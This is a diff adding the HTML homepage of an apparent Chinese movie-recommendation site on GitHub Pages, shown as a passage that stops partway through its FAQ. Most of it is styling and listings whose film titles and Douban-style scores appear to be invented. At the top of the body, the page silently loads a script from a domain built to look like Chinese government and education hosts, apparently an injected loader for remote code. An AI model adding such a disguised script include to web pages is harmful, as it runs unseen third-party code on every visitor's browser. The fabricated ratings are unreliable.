@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>419电影网 - 高分电影与热门影视在线观看</title>
+<meta name="keywords" content="419电影网, 高分电影, 热门影视, 在线观看, 419dianyingwang-wap">
+<meta name="description" content="419电影网(https://419dianyingwang-wap.github.io)精选高分电影与热门影视，动作、科幻、悬疑、喜剧全品类，帮你快速找到值得一看的好片。">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://419dianyingwang-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "419电影网",
+  "url": "https://419dianyingwang-wap.github.io/",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://419dianyingwang-wap.github.io/#search={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<style>
+/* ===== 基础 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:#08090f;color:#e6e8f0;line-height:1.7;overflow-x:hidden;
+}
+/* 霓虹网格背景 */
+body::before{
+  content:"";position:fixed;inset:0;z-index:-2;pointer-events:none;
+  background:
+    linear-gradient(rgba(56,189,248,.05) 1px,transparent 1px) 0 0/100% 46px,
+    linear-gradient(90deg,rgba(56,189,248,.05) 1px,transparent 1px) 0 0/46px 100%,
+    radial-gradient(900px 600px at 15% 10%,rgba(236,72,153,.16),transparent 60%),
+    radial-gradient(800px 500px at 88% 20%,rgba(56,189,248,.14),transparent 60%),
+    #08090f;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px}
+
+/* ===== 头部 ===== */
+header{position:sticky;top:0;z-index:100;background:rgba(8,9,15,.78);backdrop-filter:blur(16px);border-bottom:1px solid rgba(255,255,255,.06)}
+.hd{display:flex;align-items:center;justify-content:space-between;height:70px;gap:18px}
+.logo{display:flex;align-items:center;gap:11px}
+.logo .mk{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:17px;color:#08090f;background:linear-gradient(135deg,#38bdf8,#ec4899);box-shadow:0 0 20px rgba(236,72,153,.45)}
+.logo b{font-size:21px;font-weight:900;letter-spacing:.5px}
+.logo b i{font-style:normal;background:linear-gradient(90deg,#38bdf8,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
+.nav{display:flex;align-items:center;gap:4px}
+.nav a{padding:8px 15px;border-radius:9px;font-size:14.5px;color:#a5abbd;transition:.25s;font-weight:500}
+.nav a:hover,.nav a.on{color:#fff;background:rgba(236,72,153,.14)}
+.nav a.on{box-shadow:inset 0 -2px 0 #ec4899}
+.srch{display:flex;align-items:center;gap:8px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);border-radius:11px;padding:7px 14px}
+.srch input{background:none;border:0;outline:0;color:#fff;font-size:14px;width:150px}
+.srch input::placeholder{color:#6b7280}
+.mb{display:none;background:none;border:0;color:#fff;font-size:24px;cursor:pointer;padding:4px}
+.ov{display:none}
+
+/* ===== 首屏：大字霓虹 + 搜索 + 快速入口 ===== */
+.hero{padding:64px 0 44px}
+.htop{display:flex;align-items:flex-end;justify-content:space-between;gap:30px;flex-wrap:wrap}
+.htop h1{font-size:58px;line-height:1.12;font-weight:900;letter-spacing:1px}
+.htop h1 .n{font-size:80px;background:linear-gradient(90deg,#38bdf8,#ec4899,#fbbf24);background-size:200% 100%;-webkit-background-clip:text;background-clip:text;color:transparent;animation:sh 5s linear infinite}
+@keyframes sh{to{background-position:200% 0}}
+.htop h1 small{display:block;font-size:19px;font-weight:500;color:#8b91a3;margin-top:14px;letter-spacing:0}
+.sbox{width:100%;max-width:720px;margin:34px auto 0;position:relative}
+.sbox input{width:100%;padding:19px 130px 19px 24px;border-radius:16px;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.05);font-size:16px;color:#fff;outline:0;transition:.3s}
+.sbox input:focus{border-color:#ec4899;box-shadow:0 0 0 4px rgba(236,72,153,.16)}
+.sbox button{position:absolute;right:6px;top:6px;bottom:6px;padding:0 28px;border:0;border-radius:11px;background:linear-gradient(135deg,#ec4899,#f43f5e);color:#fff;font-weight:700;font-size:15px;cursor:pointer;transition:.25s}
+.sbox button:hover{filter:brightness(1.1);transform:scale(1.02)}
+.kw{display:flex;flex-wrap:wrap;gap:9px;justify-content:center;margin-top:18px}
+.kw a{font-size:13px;color:#a5abbd;padding:5px 13px;border-radius:20px;border:1px solid rgba(255,255,255,.1);transition:.25s}
+.kw a:hover{color:#fff;border-color:#38bdf8;background:rgba(56,189,248,.12)}
+.quick{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;margin-top:44px}
+.qk{text-align:center;padding:20px 10px;border-radius:15px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);transition:.3s;cursor:pointer}
+.qk:hover{border-color:#ec4899;background:rgba(236,72,153,.1);transform:translateY(-5px)}
+.qk .ic{font-size:28px;display:block}
+.qk h4{font-size:15px;margin-top:9px;font-weight:600}
+.qk span{font-size:12px;color:#6b7280}
+
+/* 封面占位（纯CSS绘制） */
+.ph{position:relative;overflow:hidden;border-radius:12px}
+.ph i{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);z-index:2;font-style:normal;color:rgba(255,255,255,.9);font-size:18px;text-shadow:0 2px 8px rgba(0,0,0,.4)}
+.ph::before{content:"";position:absolute;inset:0;background:
+  radial-gradient(circle at 28% 22%,rgba(255,255,255,.3),transparent 45%),
+  radial-gradient(circle at 75% 72%,rgba(0,0,0,.3),transparent 50%)}
+.ph1{background:linear-gradient(135deg,#7c2d12,#f97316)}
+.ph2{background:linear-gradient(135deg,#0c4a6e,#06b6d4)}
+.ph3{background:linear-gradient(135deg,#4c1d95,#d946ef)}
+.ph4{background:linear-gradient(135deg,#365314,#a3e635)}
+.ph5{background:linear-gradient(135deg,#831843,#fb7185)}
+.ph6{background:linear-gradient(135deg,#0f766e,#2dd4bf)}
+.ph7{background:linear-gradient(135deg,#1e3a8a,#60a5fa)}
+.ph8{background:linear-gradient(135deg,#9f1239,#f43f5e)}
+.ph9{background:linear-gradient(135deg,#713f12,#fbbf24)}
+.ph10{background:linear-gradient(135deg,#155e75,#22d3ee)}
+.ph11{background:linear-gradient(135deg,#3b0764,#c084fc)}
+.ph12{background:linear-gradient(135deg,#052e16,#4ade80)}
+
+/* ===== 通用板块 ===== */
+section{padding:66px 0}
+.stitle{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:30px;flex-wrap:wrap}
+.stitle h2{font-size:25px;font-weight:900;display:flex;align-items:center;gap:11px}
+.stitle h2 em{font-style:normal;width:4px;height:24px;border-radius:3px;background:linear-gradient(#38bdf8,#ec4899)}
+.stitle small{font-size:13.5px;color:#6b7280;font-weight:400;margin-left:2px}
+.more{font-size:13.5px;color:#a5abbd;transition:.2s}
+.more:hover{color:#38bdf8}
+
+/* ===== 栏目1：正在热播 - 大图焦点轮播感 + 侧栏 ===== */
+.feat{display:grid;grid-template-columns:1.55fr 1fr;gap:20px}
+.fmain{position:relative;border-radius:20px;overflow:hidden;min-height:400px;cursor:pointer}
+.fmain .ph{position:absolute;inset:0}
+.fmain .ph{aspect-ratio:auto;height:100%}
+.fmain .scrim{position:absolute;inset:0;background:linear-gradient(to top,rgba(8,9,15,.96) 18%,rgba(8,9,15,.2) 65%,rgba(8,9,15,.5))}
+.fmain .txt{position:absolute;left:30px;right:30px;bottom:28px;z-index:2}
+.fmain .txt .badge{display:inline-block;font-size:12px;color:#fff;background:linear-gradient(135deg,#ec4899,#f43f5e);padding:4px 11px;border-radius:6px;font-weight:600}
+.fmain .txt h3{font-size:31px;font-weight:900;margin:12px 0 8px}
+.fmain .txt p{color:#c2c6d3;font-size:14px;max-width:540px}
+.fmain:hover .ph{transform:scale(1.04)}
+.fmain .ph{transition:transform .6s}
+.fsub{display:grid;grid-template-rows:1fr 1fr;gap:20px}
+.fsub .it{display:flex;gap:14px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);border-radius:16px;padding:14px;transition:.3s;cursor:pointer;align-items:center}
+.fsub .it:hover{border-color:#38bdf8;background:rgba(56,189,248,.08);transform:translateX(5px)}
+.fsub .it .ph{width:110px;height:74px;flex:0 0 110px}
+.fsub .it .tx h4{font-size:15px;font-weight:600;line-height:1.4}
+.fsub .it .tx .st{font-size:12px;color:#6b7280;margin-top:7px}
+
+/* ===== 栏目2：高分片单 - 双行横向滚动瀑布 ===== */
+.scrl{display:flex;gap:16px;overflow-x:auto;padding:4px 2px 20px;scrollbar-width:thin}
+.scrl::-webkit-scrollbar{height:8px}
+.scrl::-webkit-scrollbar-thumb{background:#2a2d3e;border-radius:8px}
+.poster{flex:0 0 190px;cursor:pointer;transition:.35s}
+.poster .ph{aspect-ratio:2/3}
+.poster .ph i{font-size:15px}
+.poster .meta{padding:11px 2px}
+.poster .meta h4{font-size:14.5px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.poster .meta .st{font-size:12px;color:#6b7280;margin-top:5px;display:flex;justify-content:space-between}
+.poster .meta .sc{color:#fbbf24;font-weight:700}
+.poster:hover{transform:translateY(-7px)}
+.poster:hover .ph{box-shadow:0 0 24px rgba(236,72,153,.4)}
+
+/* ===== 栏目3：类型分区 - 三栏混合（大图+列表）===== */
+.mix{display:grid;grid-template-columns:1fr 1fr 1fr;gap:20px}
+.mixcol h3{font-size:16px;font-weight:700;margin-bottom:14px;display:flex;align-items:center;gap:8px;padding-bottom:10px;border-bottom:1px solid rgba(255,255,255,.08)}
+.mixcol h3 span{font-size:12px;font-weight:400;color:#6b7280}
+.mixcol .lead{display:block;border-radius:13px;overflow:hidden;cursor:pointer;margin-bottom:12px}
+.mixcol .lead .ph{aspect-ratio:16/9}
+.mixcol .lead .cap{font-size:13.5px;font-weight:600;padding:9px 2px}
+.mixcol .lead:hover .ph{filter:brightness(1.12)}
+.mixcol ul li{display:flex;justify-content:space-between;gap:10px;padding:8px 2px;border-bottom:1px dashed rgba(255,255,255,.06);font-size:13.5px;cursor:pointer;transition:.2s}
+.mixcol ul li:hover{color:#38bdf8;padding-left:5px}
+.mixcol ul li b{font-weight:400;color:#6b7280;font-size:12px;white-space:nowrap}
+
+/* ===== 栏目4：猜你喜欢 - 三列大卡片 ===== */
+.guess{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.gc{border-radius:17px;overflow:hidden;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);transition:.35s;cursor:pointer}
+.gc:hover{transform:translateY(-6px);border-color:#ec4899;box-shadow:0 18px 38px rgba(0,0,0,.4)}
+.gc .ph{aspect-ratio:16/9}
+.gc .ph i{font-size:20px}
+.gc .in{padding:16px 18px}
+.gc .in h4{font-size:17px;font-weight:700}
+.gc .in p{font-size:13px;color:#8b91a3;margin-top:7px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.gc .in .tg{margin-top:13px;display:flex;gap:7px;flex-wrap:wrap}
+.gc .in .tg em{font-style:normal;font-size:11.5px;color:#a5abbd;background:rgba(255,255,255,.06);padding:3px 9px;border-radius:5px}
+
+/* ===== 栏目5：更新时间表 - 星期 tab 切换 ===== */
+.wk{border:1px solid rgba(255,255,255,.08);border-radius:18px;overflow:hidden;background:rgba(255,255,255,.03)}
+.wkbar{display:flex;flex-wrap:wrap;background:rgba(255,255,255,.03);border-bottom:1px solid rgba(255,255,255,.08)}
+.wkd{flex:1;min-width:110px;text-align:center;padding:14px 8px;cursor:pointer;transition:.25s;border-bottom:2px solid transparent;font-size:14px;color:#a5abbd}
+.wkd b{display:block;font-size:11px;color:#6b7280;font-weight:400}
+.wkd.on{color:#fff;border-bottom-color:#ec4899;background:rgba(236,72,153,.1)}
+.wkd.on b{color:#f9a8d4}
+.wkpan{padding:22px;display:none}
+.wkpan.on{display:block;animation:fd .35s}
+@keyframes fd{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+.wkpan table{width:100%;border-collapse:collapse;font-size:13.5px}
+.wkpan th{text-align:left;font-size:12px;color:#6b7280;font-weight:400;padding:8px 10px;border-bottom:1px solid rgba(255,255,255,.08)}
+.wkpan td{padding:11px 10px;border-bottom:1px solid rgba(255,255,255,.05)}
+.wkpan tr:hover td{background:rgba(56,189,248,.06)}
+.wkpan td.n{font-weight:600}
+.wkpan td.t{color:#6b7280;font-size:12px}
+
+/* ===== 栏目6：电影冷知识 - 手风琴 FAQ ===== */
+.acc{border:1px solid rgba(255,255,255,.08);border-radius:16px;overflow:hidden}
+.ac{background:rgba(255,255,255,.03);border-bottom:1px solid rgba(255,255,255,.06)}
+.ac:last-child{border-bottom:0}
+.acq{display:flex;justify-content:space-between;align-items:center;padding:18px 22px;cursor:pointer;font-size:15.5px;font-weight:600;transition:.25s}
+.acq:hover{color:#38bdf8;background:rgba(56,189,248,.06)}
+.acq .ar{color:#6b7280;transition:.3s;font-size:18px}
+.ac.open .acq .ar{transform:rotate(45deg);color:#ec4899}
+.acb{max-height:0;overflow:hidden;transition:max-height .4s ease}
+.acb div{padding:0 22px 20px;color:#a5abbd;font-size:14px}
+
+/* ===== 页脚 ===== */
+footer{background:#05060a;border-top:1px solid rgba(255,255,255,.06);padding:54px 0 22px;margin-top:26px}
+.ft{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:34px}
+.logo2 b{font-size:22px;font-weight:900}
+.logo2 b i{font-style:normal;background:linear-gradient(90deg,#38bdf8,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
+.ft p{font-size:13px;color:#6b7280;margin-top:14px;max-width:320px}
+.fcol h5{font-size:15px;color:#fff;margin-bottom:13px}
+.fcol a{display:block;font-size:13px;color:#8b91a3;padding:5px 0;transition:.2s}
+.fcol a:hover{color:#38bdf8;padding-left:5px}
+.fbot{border-top:1px solid rgba(255,255,255,.07);margin-top:36px;padding-top:18px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:12px;color:#5c6275}
+.fbot a{color:#8b91a3}
+.fbot a:hover{color:#38bdf8}
+
+/* ===== 浮动按钮 ===== */
+.fix{position:fixed;right:18px;bottom:22px;display:flex;flex-direction:column;gap:10px;z-index:99}
+.fix button{width:46px;height:46px;border-radius:14px;border:0;background:rgba(255,255,255,.08);backdrop-filter:blur(10px);box-shadow:0 8px 22px rgba(0,0,0,.3);font-size:17px;cursor:pointer;transition:.25s;color:#fff}
+.fix button:hover{background:linear-gradient(135deg,#ec4899,#f43f5e);color:#fff}
+#topBtn{opacity:0;visibility:hidden;transform:translateY(10px)}
+#topBtn.show{opacity:1;visibility:visible;transform:translateY(0)}
+
+/* ===== 响应式 ===== */
+@media(max-width:960px){
+  .htop h1{font-size:40px}
+  .htop h1 .n{font-size:54px}
+  .nav{position:fixed;top:0;right:0;bottom:0;width:270px;flex-direction:column;align-items:flex-start;background:#0c0d14;padding:80px 20px 30px;gap:2px;transform:translateX(100%);transition:.35s;z-index:101;border-left:1px solid rgba(255,255,255,.08)}
+  .nav.open{transform:translateX(0)}
+  .nav a{width:100%}
+  .mb{display:block;z-index:102}
+  .srch{display:none}
+  .ov{position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:99;display:none}
+  .ov.show{display:block}
+  .quick{grid-template-columns:repeat(3,1fr)}
+  .feat{grid-template-columns:1fr}
+  .fmain{min-height:340px}
+  .guess,.mix{grid-template-columns:1fr}
+  .wkpan table,.wkpan thead{display:block}
+  .wkpan tr{display:flex;flex-wrap:wrap;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.06)}
+  .wkpan td{flex:1 1 50%;border:0;padding:6px 10px}
+}
+@media(max-width:560px){
+  section{padding:46px 0}
+  .stitle h2{font-size:20px}
+  .htop h1{font-size:31px}
+  .htop h1 .n{font-size:42px}
+  .htop h1 small{font-size:15px}
+  .sbox input{padding:16px 100px 16px 18px;font-size:15px}
+  .sbox button{padding:0 18px;font-size:14px}
+  .fmain .txt{padding:0;left:20px;right:20px;bottom:20px}
+  .fmain .txt h3{font-size:23px}
+  .fsub .it .ph{width:90px;height:62px;flex:0 0 90px}
+  .quick{grid-template-columns:repeat(2,1fr)}
+  .poster{flex:0 0 150px}
+  .ft{grid-template-columns:1fr}
+  .fbot{flex-direction:column;text-align:center}
+  .wkd{min-width:60px;padding:11px 4px;font-size:13px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- 头部 -->
+<header>
+  <div class="wrap hd">
+    <a class="logo" href="index.html"><span class="mk">419</span><b>电影<i>网</i></b></a>
+    <nav class="nav" id="nav">
+      <a href="#home" class="on">首页</a>
+      <a href="#hot">正在热播</a>
+      <a href="#top">高分片单</a>
+      <a href="#genre">类型分区</a>
+      <a href="#guess">猜你喜欢</a>
+      <a href="#update">更新时间表</a>
+      <a href="#faq">电影冷知识</a>
+    </nav>
+    <div class="srch"><span>🔍</span><input placeholder="搜索电影 / 导演 / 演员"></div>
+    <button class="mb" id="mb" aria-label="菜单">☰</button>
+  </div>
+  <div class="ov" id="ov"></div>
+</header>
+
+<!-- 首屏：霓虹大字 + 搜索 + 快速入口 -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="htop">
+      <h1>看电影，<span class="n">419</span><small>419电影网(419dianyingwang-wap)—— 精选高分电影与热门影视，帮你少踩雷、多看好片</small></h1>
+    </div>
+    <div class="sbox">
+      <input placeholder="🔍  搜索电影名 / 导演 / 演员 / 类型…" aria-label="搜索">
+      <button onclick="location.href='#top'">搜索好片</button>
+    </div>
+    <div class="kw">
+      <a href="#genre">动作大片</a><a href="#genre">科幻烧脑</a><a href="#genre">悬疑犯罪</a><a href="#genre">喜剧爆笑</a><a href="#genre">爱情治愈</a><a href="#genre">恐怖惊悚</a><a href="#genre">动画亲子</a><a href="#genre">经典老片</a>
+    </div>
+    <div class="quick">
+      <div class="qk"><span class="ic">🎬</span><h4>正在热播</h4><span>本周院线热映</span></div>
+      <div class="qk"><span class="ic">🏆</span><h4>高分片单</h4><span>评分 8.0 以上</span></div>
+      <div class="qk"><span class="ic">🎞️</span><h4>类型分区</h4><span>按题材找片</span></div>
+      <div class="qk"><span class="ic">⏰</span><h4>更新时间</h4><span>每日上新日历</span></div>
+      <div class="qk"><span class="ic">💡</span><h4>电影冷知识</h4><span>背后的故事</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目1：正在热播（大图焦点 + 侧栏） -->
+<section id="hot">
+  <div class="wrap">
+    <div class="stitle">
+      <h2><em></em>正在热播 <small>本周院线 & 全网热度</small></h2>
+      <a class="more" href="#hot">更多热播 ›</a>
+    </div>
+    <div class="feat">
+      <div class="fmain">
+        <div class="ph ph1"><i>▶</i></div>
+        <div class="scrim"></div>
+        <div class="txt"><span class="badge">本周最热</span><h3>极速追击</h3><p>一场横跨三城的极速飙车追逐，动作场面全程高能，反转不断。豆瓣 8.4 分，本周热度榜首。</p></div>
+      </div>
+      <div class="fsub">
+        <div class="it"><div class="ph ph2"></div><div class="tx"><h4>深海迷踪</h4><div class="st">科幻冒险 · 豆瓣 8.6</div></div></div>
+        <div class="it"><div class="ph ph3"></div><div class="tx"><h4>记忆拼图</h4><div class="st">悬疑烧脑 · 豆瓣 8.9</div></div></div>
+        <div class="it"><div class="ph ph4"></div><div class="tx"><h4>归途列车</h4><div class="st">温情剧情 · 豆瓣 8.3</div></div></div>
+        <div class="it"><div class="ph ph5"></div><div class="tx"><h4>红玫瑰与枪</h4><div class="st">犯罪动作 · 豆瓣 7.9</div></div></div>
+        <div class="it"><div class="ph ph6"></div><div class="tx"><h4>云端之城</h4><div class="st">奇幻冒险 · 豆瓣 8.1</div></div></div>
+        <div class="it"><div class="ph ph7"></div><div class="tx"><h4>无声证言</h4><div class="st">法律剧情 · 豆瓣 8.5</div></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2：高分片单（海报纵向滚动） -->
+<section id="top" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.02) 40%,transparent);">
+  <div class="wrap">
+    <div class="stitle">
+      <h2><em></em>高分片单 <small>评分 8.0 以上精选</small></h2>
+      <a class="more" href="#top">完整片单 ›</a>
+    </div>
+    <div class="scrl">
+      <div class="poster"><div class="ph ph8"><i>▶</i></div><div class="meta"><h4>记忆拼图</h4><div class="st"><span>悬疑</span><span class="sc">8.9</span></div></div></div>
+      <div class="poster"><div class="ph ph2"><i>▶</i></div><div class="meta"><h4>深海迷踪</h4><div class="st"><span>科幻</span><span class="sc">8.6</span></div></div></div>
+      <div class="poster"><div class="ph ph7"><i>▶</i></div><div class="meta"><h4>无声证言</h4><div class="st"><span>剧情</span><span class="sc">8.5</span></div></div></div>
+      <div class="poster"><div class="ph ph1"><i>▶</i></div><div class="meta"><h4>极速追击</h4><div class="st"><span>动作</span><span class="sc">8.4</span></div></div></div>
+      <div class="poster"><div class="ph ph9"><i>▶</i></div><div class="meta"><h4>老地方</h4><div class="st"><span>喜剧</span><span class="sc">8.2</span></div></div></div>
+      <div class="poster"><div class="ph ph6"><i>▶</i></div><div class="meta"><h4>云端之城</h4><div class="st"><span>奇幻</span><span class="sc">8.1</span></div></div></div>
+      <div class="poster"><div class="ph ph4"><i>▶</i></div><div class="meta"><h4>归途列车</h4><div class="st"><span>温情</span><span class="sc">8.3</span></div></div></div>
+      <div class="poster"><div class="ph ph10"><i>▶</i></div><div class="meta"><h4>极地之光</h4><div class="st"><span>纪录</span><span class="sc">8.7</span></div></div></div>
+      <div class="poster"><div class="ph ph11"><i>▶</i></div><div class="meta"><h4>午夜诗人</h4><div class="st"><span>文艺</span><span class="sc">8.0</span></div></div></div>
+      <div class="poster"><div class="ph ph12"><i>▶</i></div><div class="meta"><h4>绿野追踪</h4><div class="st"><span>冒险</span><span class="sc">8.2</span></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3：类型分区（三栏混合） -->
+<section id="genre">
+  <div class="wrap">
+    <div class="stitle">
+      <h2><em></em>类型分区 <small>按题材快速找片</small></h2>
+      <a class="more" href="#genre">全部类型 ›</a>
+    </div>
+    <div class="mix">
+      <div class="mixcol">
+        <h3>🎬 动作 / 科幻 <span>Action · Sci-Fi</span></h3>
+        <div class="lead"><div class="ph ph1"></div><div class="cap">极速追击 · 豆瓣 8.4</div></div>
+        <ul><li>深海迷踪 <b>8.6</b></li><li>云端之城 <b>8.1</b></li><li>红玫瑰与枪 <b>7.9</b></li><li>星际回响 <b>8.3</b></li><li>机械之心 <b>7.8</b></li></ul>
+      </div>
+      <div class="mixcol">
+        <h3>🔍 悬疑 / 犯罪 <span>Suspense</span></h3>
+        <div class="lead"><div class="ph ph3"></div><div class="cap">记忆拼图 · 豆瓣 8.9</div></div>
+        <ul><li>无声证言 <b>8.5</b></li><li>第七重门 <b>8.2</b></li><li>暗室 <b>7.9</b></li><li>消失的乘客 <b>8.0</b></li><li>逆光追凶 <b>8.1</b></li></ul>
+      </div>
+      <div class="mixcol">
+        <h3>😂 喜剧 / 温情 <span>Comedy · Drama</span></h3>
+        <div class="lead"><div class="ph ph9"></div><div class="cap">老地方 · 豆瓣 8.2</div></div>
+        <ul><li>归途列车 <b>8.3</b></li><li>婚礼前夜 <b>7.7</b></li><li>一封信的距离 <b>8.0</b></li><li>最好的我们 <b>7.8</b></li><li>邻居家的猫 <b>7.6</b></li></ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4：猜你喜欢（大卡片） -->
+<section id="guess" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.02) 45%);">
+  <div class="wrap">
+    <div class="stitle">
+      <h2><em></em>猜你喜欢 <small>基于你的口味推荐</small></h2>
+      <a class="more" href="#guess">换一批 ›</a>
+    </div>
+    <div class="guess">
+      <div class="gc"><div class="ph ph2"><i>▶</i></div><div class="in"><h4>深海迷踪</h4><p>一支深海科考队意外发现沉没城市的秘密，越往下潜，真相越令人窒息。</p><div class="tg"><em>科幻</em><em>冒险</em><em>烧脑</em></div></div></div>
+      <div class="gc"><div class="ph ph7"><i>▶</i></div><div class="in"><h4>无声证言</h4><p>聋哑女律师用一句证词逆转庭审，法庭戏张力十足，演技全程在线。</p><div class="tg"><em>剧情</em><em>律政</em><em>高分</em></div></div></div>
+      <div class="gc"><div class="ph ph10"><i>▶</i></div><div class="in"><h4>极地之光</h4><p>真实纪录北极科考站一年的坚守，极光之下的孤独与壮美让人动容。</p><div class="tg"><em>纪录</em><em>自然</em><em>治愈</em></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5：更新时间表（星期tab+表格） -->
+<section id="update">
+  <div class="wrap">
+    <div class="stitle">
+      <h2><em></em>更新时间表 <small>每日上新，不错过</small></h2>
+    </div>
+    <div class="wk">
+      <div class="wkbar">
+        <div class="wkd on">周一 <b>10-05</b></div><div class="wkd">周二 <b>10-06</b></div><div class="wkd">周三 <b>10-07</b></div><div class="wkd">周四 <b>10-08</b></div><div class="wkd">周五 <b>10-09</b></div><div class="wkd">周六 <b>10-10</b></div><div class="wkd">周日 <b>10-11</b></div>
+      </div>
+      <div class="wkpan on"><table><thead><tr><th>影片</th><th>类型</th><th>时长</th><th>评分</th></tr></thead><tbody>
+        <tr><td class="n">极速追击</td><td>动作</td><td class="t">128 分钟</td><td class="t">8.4</td></tr>
+        <tr><td class="n">老地方</td><td>喜剧</td><td class="t">105 分钟</td><td class="t">8.2</td></tr>
+        <tr><td class="n">绿野追踪</td><td>冒险</td><td class="t">116 分钟</td><td class="t">8.2</td></tr>
+        <tr><td class="n">一封信的距离</td><td>温情</td><td class="t">98 分钟</td><td class="t">8.0</td></tr>
+      </tbody></table></div>
+      <div class="wkpan"><table><thead><tr><th>影片</th><th>类型</th><th>时长</th><th>评分</th></tr></thead><tbody>
+        <tr><td class="n">星际回响</td><td>科幻</td><td class="t">132 分钟</td><td class="t">8.3</td></tr>
+        <tr><td class="n">婚礼前夜</td><td>喜剧</td><td class="t">102 分钟</td><td class="t">7.7</td></tr>
+        <tr><td class="n">暗室</td><td>悬疑</td><td class="t">95 分钟</td><td class="t">7.9</td></tr>
+      </tbody></table></div>
+      <div class="wkpan"><table><thead><tr><th>影片</th><th>类型</th><th>时长</th><th>评分</th></tr></thead><tbody>
+        <tr><td class="n">第七重门</td><td>悬疑</td><td class="t">110 分钟</td><td class="t">8.2</td></tr>
+        <tr><td class="n">机械之心</td><td>科幻</td><td class="t">121 分钟</td><td class="t">7.8</td></tr>
+        <tr><td class="n">最好的我们</td><td>青春</td><td class="t">108 分钟</td><td class="t">7.8</td></tr>
+      </tbody></table></div>
+      <div class="wkpan"><table><thead><tr><th>影片</th><th>类型</th><th>时长</th><th>评分</th></tr></thead><tbody>
+        <tr><td class="n">消失的乘客</td><td>悬疑</td><td class="t">99 分钟</td><td class="t">8.0</td></tr>
+        <tr><td class="n">邻居家的猫</td><td>喜剧</td><td class="t">92 分钟</td><td class="t">7.6</td></tr>
+        <tr><td class="n">逆光追凶</td><td>犯罪</td><td class="t">114 分钟</td><td class="t">8.1</td></tr>
+      </tbody></table></div>
+      <div class="wkpan"><table><thead><tr><th>影片</th><th>类型</th><th>时长</th><th>评分</th></tr></thead><tbody>
+        <tr><td class="n">午夜诗人</td><td>文艺</td><td class="t">103 分钟</td><td class="t">8.0</td></tr>
+        <tr><td class="n">红玫瑰与枪</td><td>犯罪</td><td class="t">119 分钟</td><td class="t">7.9</td></tr>
+        <tr><td class="n">云端之城</td><td>奇幻</td><td class="t">126 分钟</td><td class="t">8.1</td></tr>
+      </tbody></table></div>
+      <div class="wkpan"><table><thead><tr><th>影片</th><th>类型</th><th>时长</th><th>评分</th></tr></thead><tbody>
+        <tr><td class="n">归途列车</td><td>温情</td><td class="t">106 分钟</td><td class="t">8.3</td></tr>
+        <tr><td class="n">记忆拼图</td><td>悬疑</td><td class="t">112 分钟</td><td class="t">8.9</td></tr>
+        <tr><td class="n">极速追击</td><td>动作</td><td class="t">128 分钟</td><td class="t">8.4</td></tr>
+      </tbody></table></div>
+      <div class="wkpan"><table><thead><tr><th>影片</th><th>类型</th><th>时长</th><th>评分</th></tr></thead><tbody>
+        <tr><td class="n">无声证言</td><td>剧情</td><td class="t">124 分钟</td><td class="t">8.5</td></tr>
+        <tr><td class="n">极地之光</td><td>纪录</td><td class="t">96 分钟</td><td class="t">8.7</td></tr>
+        <tr><td class="n">深海迷踪</td><td>科幻</td><td class="t">133 分钟</td><td class="t">8.6</td></tr>
+      </tbody></table></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目6：电影冷知识（手风琴） -->
+<section id="faq" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.02));">
+  <div class="wrap">
+    <div class="stitle">
+      <h2><em></em>电影冷知识 <small>银幕背后的故事</small></h2>
+    </div>
+    <div class="acc">
+      <div class="ac open"><div class="acq">为什么 419 这个数字常被用在电影里？<span class="ar">＋</span></div><div class="acb"><div>「419」在中文语境里自带悬疑感和话题性，不少悬疑、犯罪题材的影片喜欢用类似数字做片名或代号，制造记忆点。本站取名 419 电影网，也是希望每部推荐都让人「一眼记住、一看上瘾」。</div></div></div>
